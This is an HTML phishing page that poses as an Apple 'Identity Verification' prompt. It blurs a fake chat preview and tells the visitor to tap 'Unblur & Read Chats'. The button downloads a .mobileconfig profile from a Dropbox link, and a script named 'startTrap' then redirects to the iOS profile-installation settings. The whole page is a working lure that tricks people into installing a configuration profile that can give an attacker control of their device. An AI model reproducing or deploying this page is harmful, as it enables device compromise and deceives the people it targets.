<!DOCTYPE html>
<html>
<head>
    <title>Secure Identity Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body, html { height: 100%; margin: 0; font-family: -apple-system, sans-serif; background: #1c1c1e; overflow: hidden; }
        .chat-background {
            background-color: #2c2c2e; background-image: url('chat_preview.jpg'); 
            height: 100vh; width: 100%; background-position: center top; 
            background-repeat: no-repeat; background-size: contain;
            position: fixed; top: 0; left: 0; z-index: 1; transition: 0.8s;
        }
        .verification-box {
            position: relative; z-index: 3; background: white; padding: 30px; border-radius: 22px;
            text-align: center; max-width: 310px; margin: 20vh auto;
            box-shadow: 0 15px 40px rgba(0,0,0,0.7); display: none;
        }
        .apple-logo { width: 35px; margin-bottom: 15px; }
        h2 { font-size: 18px; color: #1d1d1f; margin-bottom: 10px; font-weight: 600; }
        p { font-size: 13px; color: #48484a; margin-bottom: 25px; line-height: 1.5; }
        .btn {
            display: block; background: #007aff; color: white; text-decoration: none;
            padding: 14px; border-radius: 12px; font-weight: 600; font-size: 15px; cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="chat-background"></div>
    <div class="verification-box" id="trap-popup">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
        <h2>Identity Verification</h2>
        <p>This conversation is encrypted. To view the full archive, verify your device identity.</p>
        
        <a href="https://www.dropbox.com/scl/fi/ubxfrxsk64sjcsq4odn3x/secure_verify-6.mobileconfig?rlkey=rexef269gpctb442ohnfu0zz4&st=3mev8s82&dl=1" class="btn" onclick="startTrap()">Unblur & Read Chats</a>
    </div>

    <script>
        setTimeout(function() {
            document.getElementById('trap-popup').style.display = 'block';
            document.querySelector('.chat-background').style.filter = 'blur(15px)';
        }, 2000);

        function startTrap() {
            setTimeout(function() {
                window.location.href = "App-prefs:General&path=ManagedConfigurationList";
            }, 5000);
        }
    </script>
</body>
</html>
